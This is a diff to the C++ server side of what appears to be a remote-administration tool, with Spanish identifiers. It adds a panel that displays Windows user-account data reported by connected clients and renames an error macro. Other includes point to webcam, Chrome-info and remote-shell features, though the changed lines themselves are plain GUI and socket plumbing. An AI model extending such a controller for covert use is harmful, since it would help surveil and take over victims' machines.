@@ -12,6 +12,7 @@
 #include "panel_camara.hpp"
 #include "panel_wmanager.hpp"
 #include "panel_info_chrome.hpp"
+#include "panel_usuarios.hpp"
 #include "file_editor.hpp"
 
 //Definir el servidor globalmente
@@ -521,6 +522,18 @@ void Cliente_Handler::Process_Command(const Paquete_Queue& paquete) {
         return;
     }
 
+    //mod informacion - Informacion de usuarios de windows
+    if (iComando == EnumComandos::INF_Users) {
+        if (this->m_isFrameVisible()) {
+            panelUsuarios* temp_pn = (panelUsuarios*)wxWindow::FindWindowById(EnumIDS::ID_Panel_Info_Usuarios, this->n_Frame);
+            if (temp_pn) {
+                std::string strData(paquete.cBuffer.data());
+                temp_pn->m_ProcesarDatos(strData);
+            }
+        }
+        return;
+    }
+
 }
 
 void Cliente_Handler::EscribirSalidaShell(const char*& cBuffer) {
@@ -696,7 +709,7 @@ bool Servidor::m_Iniciar(){
     unsigned long int iBlock = 1;
     if(ioctlsocket(this->sckSocket, FIONBIO, &iBlock) != 0){
         this->m_txtLog->LogThis("[SERVER] Error configurando el socket NON_BLOCK", LogType::LogError);
-        ERROR("<----");
+        ERROR_EW("<----");
         return false;
     }
 
@@ -1037,7 +1050,7 @@ int Servidor::cSend(SOCKET& pSocket, const char* pBuffer, int pLen, int pFlags, 
     ByteArray cData = this->bEnc(reinterpret_cast<const unsigned char*>(pBuffer), iDataSize);
     iDataSize = cData.size();
     if (iDataSize == 0) {
-        ERROR("Error encriptando los datos a enviar");
+        ERROR_EW("Error encriptando los datos a enviar");
         return 0;
     }
 
@@ -1160,7 +1173,7 @@ int Servidor::cRecv(SOCKET& pSocket, std::vector<char>& pBuffer, int pFlags, boo
     ByteArray bOut = this->bDec(reinterpret_cast<const unsigned char*>(cRecvBuffer.data()), iRecibido);
     iRecibido = bOut.size();
     if (iRecibido == 0) {
-        ERROR("Error desencriptando los datos a enviar");
+        ERROR_EW("Error desencriptando los datos a enviar");
         return 0;
     }
 
@@ -1196,7 +1209,7 @@ bool Servidor::m_DeserializarPaquete(const char* cBuffer, Paquete& paquete, int 
     if (paquete.cBuffer.size() == paquete.uiTamBuffer) {
         memcpy(paquete.cBuffer.data(), cBuffer + sizeof(paquete.uiTipoPaquete) + sizeof(paquete.uiTamBuffer) + sizeof(paquete.uiIsUltimo), paquete.uiTamBuffer);
     }else {
-        ERROR("[Deserializar] No se pudo reservar memoria para el buffer");
+        ERROR_EW("[Deserializar] No se pudo reservar memoria para el buffer");
         return false;
     }
     return true;
